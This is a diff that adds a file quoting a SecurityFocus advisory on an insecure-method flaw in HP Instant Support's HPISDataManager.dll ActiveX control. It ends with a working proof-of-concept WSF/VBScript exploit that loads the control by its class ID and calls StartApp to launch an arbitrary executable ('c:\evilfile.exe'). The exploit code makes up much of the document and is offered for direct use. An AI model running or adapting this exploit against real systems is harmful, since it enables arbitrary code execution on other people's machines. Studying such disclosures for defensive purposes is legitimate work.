@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/29533/info
+
+
+HP Instant Support 'HPISDataManager.dll' ActiveX control is prone to an insecure-method vulnerability.
+
+Successfully exploiting this issue allows remote attackers to launch arbitrary applications with the privileges of the application running the ActiveX control (typically Internet Explorer).
+
+Note that if the attacker could place a malicious executable on the system, they would be able to launch it using this vulnerability.
+
+HP Instant Support 1.0.0.22 and earlier versions are affected.
+
+NOTE: This issue was previously covered in BID 29526 (HP Instant Support 'HPISDataManager.dll' ActiveX Control Unspecified Code Execution Vulnerabilities), but has been given its own record because of new information. 
+
+<?XML version='1.0' standalone='yes' ?> <package><job id='DoneInVBS' debug='false' error='true'> <object classid='clsid:14C1B87C-3342-445F-9B5E-365FF330A3AC' id='target' /> <script language='vbscript'> 'for debugging/custom prolog targetFile = "C:\WINDOWS\Downloaded Program Files\HPISDataManager.dll" prototype = "Function StartApp ( ByVal appName As String ) As String" memberName = "StartApp" progid = "HPISDataManagerLib.Datamgr" argCount = 1 arg1="c:\evilfile.exe" target.StartApp arg1 </script></job></package>
